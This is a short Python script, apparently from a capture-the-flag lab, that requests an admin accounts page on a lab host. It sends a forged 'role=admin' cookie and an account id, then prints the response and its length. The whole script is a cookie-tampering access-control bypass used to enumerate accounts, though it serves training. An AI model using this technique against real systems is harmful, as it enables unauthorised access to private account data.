#!/usr/bin/python

import requests
import re

def req_page():
	url= "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=1"
	headers= {"Host": "10.10.10.28",
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate",
	"Referer": "http://10.10.10.28/cdn-cgi/login/admin.php",
	"Connection": "keep-alive",
	"Cookie": "user=34322; role=admin",
	"Upgrade-Insecure-Requests": "1",
	"Cache-Control": "max-age=0"}
	response= requests.get(url, headers= headers)
	content= response.text
	print(content)
	print(response.headers)
	len_content=len(content)
	print("The lenght of content is:",len_content)

